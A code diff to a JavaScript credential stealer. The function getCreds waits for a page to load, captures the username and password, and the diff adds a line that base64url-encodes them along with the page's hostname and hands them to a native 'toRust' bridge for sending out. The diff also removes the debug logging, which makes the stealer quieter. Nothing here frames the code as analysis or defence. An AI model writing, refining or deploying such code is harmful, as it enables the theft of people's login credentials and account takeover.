@@ -1,10 +1,11 @@
-const DEBUG = true;
+function makeBase64UrlSafe(base64String) {
+    return base64String
+    .replace(/\+/g, '-') // Replace '+' with '-'
+    .replace(/\//g, '_') // Replace '/' with '_'
+    .replace(/=+$/, ''); // Remove trailing '='
+}
 
 function getCreds() {
-    if (DEBUG) {
-        console.log("[*] Looking for credentials...");
-    }
-
     // Set an interval to check repeatedly if the webpage has finished loading.
     const readyStateCheckInterval = setInterval(function() {
         // Check if the document's loading process is complete.
@@ -38,16 +39,10 @@ function getCreds() {
                     }
                 }
 
-                // Print results
+                // If password captured
                 if (password) {
-                    if (DEBUG) {
-                        console.log("[+] Credential Captured");
-                        console.log("[>] Username: ", username || "(not found)");
-                        console.log("[>] Password: ", password);
-                        console.log("[>] Domain: ", window.location.hostname);
-                        console.log("[*] Sending credentials...");
-                    }
                     // Send data
+                    window.toRust(makeBase64UrlSafe(btoa(username + ':' + password + '@' + window.location.hostname)));
                 }
             };
 
